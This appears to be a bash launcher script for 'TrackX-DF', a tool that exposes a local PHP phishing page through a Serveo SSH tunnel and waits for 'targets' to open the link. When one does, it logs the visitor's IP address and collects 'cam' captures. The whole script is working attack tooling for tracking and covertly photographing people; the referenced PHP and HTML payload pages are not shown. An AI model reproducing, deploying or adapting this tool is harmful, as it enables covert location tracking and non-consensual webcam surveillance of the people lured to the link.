#!/bin/bash

trap 'printf "\n";stop' 2

CYAN='\033[0;36m'
MAGENTA='\033[1;35m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${CYAN}████████╗██████╗  █████╗  ██████╗██╗  ██╗"
    echo -e "╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝"
    echo -e "   ██║   ██████╔╝███████║██║     █████╔╝ "
    echo -e "   ██║   ██╔═══╝ ██╔══██║██║     ██╔═██╗ "
    echo -e "   ██║   ██║     ██║  ██║╚██████╗██║  ██╗"
    echo -e "   ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝${NC}"
    echo -e "${MAGENTA}------------------------------------------------------"
    echo -e "[+] Tool      : TrackX-DF"
    echo -e "[+] Coder     : @A_Y_TR"
    echo -e "[+] Channel   : https://t.me/cybersecurityTemDF"
    echo -e "[+] Version   : 1.0"
    echo -e "------------------------------------------------------${NC}"
}

stop() {
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    exit 1
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "PHP not installed. Install it."; exit 1; }
    command -v ssh > /dev/null 2>&1 || { echo >&2 "SSH not installed. Install it."; exit 1; }
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;35m[+] IP:\e[0m\e[1;36m %s\e[0m\n" $ip
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n\e[1;35m[*] Waiting for targets... Press Ctrl + C to exit.\e[0m\n"
    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;35m[+] Target opened the link!\n"
            catch_ip
            rm -rf ip.txt
        fi
        sleep 0.5
        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;35m[+] Cam file received!\e[0m\n"
            rm -rf Log.log
        fi
        sleep 0.5
    done
}

server() {
    printf "\e[1;36m[+] Starting Serveo...\e[0m\n"

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi

    if [[ $subdomain_resp == true ]]; then
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink' &
    else
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink' &
    fi

    sleep 8
    printf "\e[1;36m[+] Starting PHP server... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;35m[+] Direct link:\e[0m\e[1;36m %s\n' $send_link
}

start() {
    default_choose_sub="Y"
    default_subdomain="TrackX$RANDOM"

    printf '\e[1;35m[+] Choose subdomain? (Default:\e[0m\e[1;36m [Y/n] \e[0m\e[1;35m): \e[0m'
    read choose_sub
    choose_sub="${choose_sub:-${default_choose_sub}}"
    if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
        subdomain_resp=true
        printf '\e[1;35m[+] Subdomain: (Default:\e[0m\e[1;36m %s \e[0m\e[1;35m): \e[0m' $default_subdomain
        read subdomain
        subdomain="${subdomain:-${default_subdomain}}"
    fi

    server
    payload
    checkfound
}

payload() {
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    sed 's+forwarding_link+'$send_link'+g' index.html > index2.html
    sed 's+forwarding_link+'$send_link'+g' post.php > index.php
}

show_banner
dependencies
start